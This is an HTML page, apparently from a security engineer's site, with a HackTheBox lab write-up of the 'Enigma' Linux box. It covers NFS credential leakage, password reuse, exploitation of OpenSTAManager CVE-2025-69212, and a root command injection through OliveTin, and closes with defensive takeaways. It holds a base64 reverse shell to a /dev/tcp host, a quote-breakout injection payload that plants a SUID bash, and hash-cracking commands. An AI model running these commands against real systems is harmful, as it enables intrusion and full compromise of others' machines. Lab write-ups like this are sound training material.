@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enigma Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      enigma
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">Enigma</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-easy">Easy</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-07-04</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — Ubuntu 24.04</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">NFS · Roundcube 1.6.16 · Dovecot · OpenSTAManager 2.9.8 · OliveTin</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVE</td>
+        <td style="padding:4px 0;color:var(--green);">CVE-2025-69212 (OpenSTAManager P7M OS command injection)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>Enigma is a mail-themed box where the whole chain is really about <strong>credential flow</strong> — every step hands you the key to the next service, and only two of the links are actual software exploits.</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — An anonymous <strong>NFS export</strong> leaks an onboarding PDF with webmail creds. Reading mail as <code>kevin</code>, then <strong>reusing his password</strong> over IMAP for <code>sarah</code>, surfaces admin credentials for an internal <strong>OpenSTAManager 2.9.8</strong> instance, which is exploited via <code>CVE-2025-69212</code> for a shell as <code>www-data</code>.</li>
+      <li style="margin-bottom:6px;"><strong>Lateral movement</strong> — The app's <code>config.inc.php</code> gives up the DB password; the <code>zz_users</code> table yields a bcrypt hash for <code>haris</code> that cracks against rockyou → user.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — A root-run <strong>OliveTin</strong> instance on localhost has a "Backup Database" action whose <code>password</code>-typed argument is unsanitised and interpolated into a shell command. A Connect-RPC call injects a command as root.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap -sC -sV -p- 10.129.30.127
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu (publickey only)
+80/tcp   open  http     nginx 1.24.0 — "Enigma Corp"
+110/tcp  open  pop3     Dovecot pop3d
+111/tcp  open  rpcbind
+143/tcp  open  imap     Dovecot imapd
+993/tcp  open  ssl/imap Dovecot imapd
+995/tcp  open  ssl/pop3 Dovecot pop3d
+2049/tcp open  nfs</pre>
+    <p>The port list <em>tells a story</em>: a full mail stack (POP3/IMAP + Roundcube) plus <strong>NFS wide open</strong>. vhost fuzzing on the web root finds a webmail subdomain:</p>
+    <pre>gobuster vhost -u http://enigma.htb --append-domain \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+Found: mail001.enigma.htb  (Roundcube Webmail 1.6.16 login)</pre>
+    <p>The two most under-used ports on the scan — <code>111</code>/<code>2049</code> — are the quiet win. Always query NFS before brute-forcing a login.</p>
+
+    <h2>Initial Access — CVE-2025-69212</h2>
+
+    <p><strong>Step 1 — NFS → onboarding creds.</strong> Ask the file server what it exports, mount it, and read the PDF an admin left behind for new hires:</p>
+    <pre>showmount -e 10.129.30.127
+# Export list:  /srv/nfs/onboarding *
+
+sudo mount -t nfs 10.129.30.127:/srv/nfs/onboarding /mnt/enigma_nfs
+ls /mnt/enigma_nfs
+# New_Employee_Access.pdf   ->  kevin : Enigma2024!</pre>
+
+    <p><strong>Step 2 — webmail + password reuse.</strong> Those creds log into Roundcube as <code>kevin</code>, whose inbox holds only a welcome mail from <code>sarah@enigma.htb</code>. The box loves credential reuse, so the same password is sprayed over IMAP against other mailboxes — <code>sarah</code> reuses it:</p>
+    <pre>openssl s_client -quiet -crlf -connect 10.129.30.127:993
+a LOGIN sarah Enigma2024!
+a OK Logged in.</pre>
+    <p>Sarah's inbox contains the payload of this whole section — provisioning credentials for an internal app:</p>
+    <pre>URL:      http://support_001.enigma.htb
+Username: admin
+Password: Ne3s4rtars78s      (OpenSTAManager)</pre>
+
+    <p><strong>Step 3 — OpenSTAManager RCE.</strong> The footer reveals <strong>OpenSTAManager 2.9.8</strong>, vulnerable to <code>CVE-2025-69212</code>: an <em>authenticated</em> OS command injection in the P7M (signed-XML) decoder. An uploaded ZIP containing a <code>.p7m</code> file with a malicious <strong>filename</strong> is passed to a shell during decoding, executing arbitrary commands.</p>
+    <pre>python3 exploit.py --url "http://support_001.enigma.htb" \
+  --username "admin" --password "Ne3s4rtars78s" \
+  --command "echo &lt;b64&gt; | base64 -d | bash"
+
+# payload (base64'd to survive the injection layer):
+echo -n 'bash -i &gt;&amp; /dev/tcp/10.10.16.199/4444 0&gt;&amp;1' | base64</pre>
+    <p><strong>Gotcha:</strong> a raw <code>bash -i &gt;&amp; /dev/tcp/...</code> silently fails — the injection context isn't bash, and the redirect/metacharacters get mangled. Base64-encode the reverse shell and decode it on the target. Confirm blind RCE with an ICMP callback (<code>ping -c3</code> + <code>tcpdump</code>) <em>before</em> debugging the shell.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">initial foothold</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -lvnp 4444</span></div>
+        <div class="t-out">Connection received on 10.129.30.127</div>
+        <div class="t-success">www-data@enigma:~/html/openstamanager$ id</div>
+        <div class="t-out">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+      </div>
+    </div>
+
+    <h2>Lateral Movement — www-data → haris</h2>
+    <p>A web app that talks to a database keeps that password in a config file the service account can read. OpenSTAManager's is <code>config.inc.php</code>:</p>
+    <pre>$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+$db_name     = 'openstamanager';</pre>
+    <p><code>su haris</code> with that password fails, but the DB itself stores the app's own user hashes. Dump them and crack offline:</p>
+    <pre>mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username,password FROM zz_users;"
+# haris : $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC  (bcrypt)
+
+hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt</pre>
+    <p>The cracked password gives an interactive <code>haris</code> session (SSH is publickey-only, so <code>su</code> / a planted key is the door), and the user flag:</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">user shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">haris@enigma</span>:~$ <span class="t-cmd">id &amp;&amp; cat user.txt</span></div>
+        <div class="t-out">uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)</div>
+        <div class="t-success">HTB{… redacted …}</div>
+      </div>
+    </div>
+
+    <h2>Privilege Escalation — haris → root</h2>
+    <p><code>sudo -l</code> is empty, but a root-owned <strong>OliveTin</strong> (a web UI for running predefined shell commands) listens on <code>127.0.0.1:1337</code>:</p>
+    <pre>ps aux | grep -i olivetin
+# root  ...  /usr/local/bin/OliveTin        &lt;- runs as ROOT
+ss -ltnp | grep 1337
+# LISTEN 127.0.0.1:1337</pre>
+    <p>The config <code>/etc/OliveTin/config.yaml</code> is root-owned (not editable), so the play is to abuse an <em>existing</em> action. Comparing argument <code>type:</code> constraints across actions reveals the weak one — every argument is a sanitising type (<code>ascii_identifier</code>, <code>int</code>, <code>choices</code>) <strong>except</strong> the <code>password</code> field, which is free-form and interpolated <em>inside single quotes</em> in the shell string:</p>
+    <pre>- title: Backup Database
+  id: backup_database
+  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} &gt; /opt/backups/backup.sql"
+  arguments:
+    - name: db_pass
+      type: password          # &lt;- NOT sanitised -&gt; quote breakout -&gt; command injection</pre>
+
+    <p><strong>The API gotcha.</strong> OliveTin's front-end speaks the <strong>Connect RPC</strong> protocol, not plain REST. A naive <code>{"actionId": "..."}</code> POST is silently ignored (the ID arrives blank). Reading the compiled JS shows the real call is <code>window.client.startAction({bindingId, arguments})</code> — the field is <code>bindingId</code>, and the request needs the <code>Connect-Protocol-Version: 1</code> header:</p>
+    <pre># db_pass value closes the quote, runs our command as root, comments out the rest:
+'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
+
+curl -s -X POST http://127.0.0.1:1337/api/StartAction \
+  -H "Content-Type: application/json" \
+  -H "Connect-Protocol-Version:1" \
+  -d @pay.json
+# {"executionTrackingId":"..."}   <- root just ran it</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">haris@enigma</span>:~$ <span class="t-cmd">ls -la /tmp/rootbash</span></div>
+        <div class="t-out">-rwsr-xr-x 1 root root 1446024 /tmp/rootbash</div>
+        <div><span class="t-prompt">haris@enigma</span>:~$ <span class="t-cmd">/tmp/rootbash -p</span></div>
+        <div class="t-success">rootbash-5.2# id</div>
+        <div class="t-out">uid=1000(haris) euid=0(root) groups=1000(haris),100(users)</div>
+        <div class="t-success">rootbash-5.2# cat /root/root.txt  ->  HTB{… redacted …}</div>
+      </div>
+    </div>
+    <p>The <code>-p</code> flag on the SUID bash is essential — without it bash drops the effective UID back to <code>haris</code>.</p>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/haris/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>World-readable NFS export (<code>/srv/nfs/onboarding *</code>) leaking credentials</td><td><span class="severity-high">High</span></td><td>Anonymous disclosure of webmail creds</td></tr>
+        <tr><td>Password reuse across mailboxes (kevin → sarah)</td><td><span class="severity-high">High</span></td><td>Access to internal app admin credentials</td></tr>
+        <tr><td>CVE-2025-69212: OpenSTAManager P7M OS command injection</td><td><span class="severity-critical">Critical</span></td><td>Remote code execution as <code>www-data</code></td></tr>
+        <tr><td>DB credentials + crackable user hashes in app config/DB</td><td><span class="severity-high">High</span></td><td>Lateral movement to <code>haris</code></td></tr>
+        <tr><td>OliveTin running as root with an unsanitised <code>password</code> action argument</td><td><span class="severity-critical">Critical</span></td><td>Command injection → full root compromise</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Never export NFS shares to <code>*</code>.</strong> Restrict by host, use <code>root_squash</code>, and never stage plaintext credentials on a network share.</li>
+      <li><strong>Enforce unique passwords per account.</strong> One reused mailbox password collapsed the entire user tier of this box.</li>
+      <li><strong>Patch internal apps too.</strong> "Internal only" (a vhost on localhost's reverse proxy) is not a mitigation — OpenSTAManager 2.9.8 was a public-CVE away from RCE.</li>
+      <li><strong>Config secrets = the next hop.</strong> A service account that can read DB passwords and user hashes is a lateral-movement ladder; scope DB users and salt/rotate credentials.</li>
+      <li><strong>Least privilege for automation tools.</strong> OliveTin had no business running as root, and any user-supplied argument reaching a shell must be validated by a strict type — obscurity (localhost binding) is not access control.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
